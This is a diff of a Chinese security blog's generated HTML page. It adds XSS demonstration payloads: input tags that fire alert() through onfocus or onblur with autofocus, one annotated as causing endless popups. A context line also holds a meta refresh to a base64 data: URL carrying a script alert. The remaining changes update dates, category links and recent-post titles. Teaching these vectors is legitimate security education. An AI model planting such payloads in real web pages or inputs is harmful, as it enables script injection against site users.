+<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
+
+<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
 
                         
                       </div>
@@ -505,7 +432,7 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/21 13:41 下午</span>
+                    <span class="date">2018/12/13 16:22 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -583,6 +510,8 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
         
             <a href="%E5%B7%A5%E5%85%B7.html"><strong>工具</strong></a>
         
+            <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
+        
             <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"><strong>渗透测试</strong></a>
         
             <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
@@ -604,31 +533,31 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
 	      
 		      
 			      <li class="post">
-			        <a href="15480046120109.html">降低cpu使用率</a>
+			        <a href="15542044701566.html">debian or ubuntu 修改终端欢迎语</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15473464131197.html">读 Monyer 文章有感</a>
+			        <a href="15542027955936.html">mysql登录提示ERROR 1524 (HY000): Plugin 'unix_socket' is not loaded解决方法</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15446969783198.html">解决windows右键新建消失问题</a>
+			        <a href="15538461504138.html">vmware三种网络模式详解</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15446973583267.html">解决npm更新或安装软件时下载较慢等问题</a>
+			        <a href="15538425408524.html">虚拟机安装win10操作系统</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15456175398128.html">自建kms服务器激活windows</a>
+			        <a href="15532282104799.html">Mac 终端设置欢迎页</a>
 			      </li>
 		     
 		  
